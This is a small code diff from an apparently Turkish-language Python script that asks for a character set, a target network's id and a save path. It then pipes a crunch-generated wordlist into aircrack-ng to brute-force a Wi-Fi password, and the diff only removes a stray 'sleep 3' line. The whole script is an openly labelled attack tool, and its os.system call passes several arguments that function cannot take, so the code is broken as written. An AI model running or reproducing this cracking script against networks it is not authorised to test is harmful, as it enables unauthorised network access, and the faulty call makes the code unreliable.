@@ -8,6 +8,5 @@ harfler = input("wordlistte ne tür karakterler olacak: ")
 id = input("attack yapacağınız internetin id'si: ")
 dosyayol = input("dosya yolu nereye kaydedeceksiniz: ")
 input("saldırı başlatılıyor...")
-sleep 3
 os.system("crunch", sayimin, sayimax, harfler, "| aircrack-ng -b", id, dosyayol, "-w-")
 print("saldırı işlemi bitti.")
